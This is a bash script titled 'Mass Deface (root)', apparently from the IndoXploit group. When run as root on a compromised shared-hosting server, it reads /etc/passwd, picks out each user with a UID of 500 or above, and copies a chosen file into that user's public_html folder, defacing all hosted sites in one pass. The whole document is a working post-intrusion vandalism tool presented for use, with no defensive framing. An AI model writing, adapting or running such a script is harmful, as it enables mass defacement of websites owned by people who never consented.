#!/bin/bash
args=("$@")
UHOME="/home"
FILE=$(pwd)"/"${args[0]}
priv=$([ $(id -u) == 0 ] && echo " here we go..........." || echo " you must root to run this file :)")

echo " ~~~~~     Mass Deface (root)    ~~~~~ "
echo " ~~      Coded by: l0c4lh34rtz      ~~ "
echo " ~    IndoXploit - Sanjungan Jiwa    ~ "
echo "------ [ usage: ./mass file ] ------"
echo ""
echo $priv
echo ""

if [ -z "$1" ]
	then
	echo "usage: ./mass file"

else

 # get list of all users
_USERS="$(awk -F':' '{ if ( $3 >= 500 ) print $1 }' /etc/passwd)"
for u in $_USERS
do 
   	_dir="${UHOME}/${u}/public_html"
   	if [ -d "$_dir" ] && [ $(id -u) == 0 ]
   	then
       	/bin/cp "$FILE" "$_dir"
       	if [ -e "$_dir/"$(basename "$FILE") ]
       		then
       		echo "[+] sukses ->" "$_dir/"$(basename "$FILE")
       		#chown $(id -un $u):$(id -gn $u) "$_dir/"$(basename "$FILE")
       	fi
   	fi
done
fi
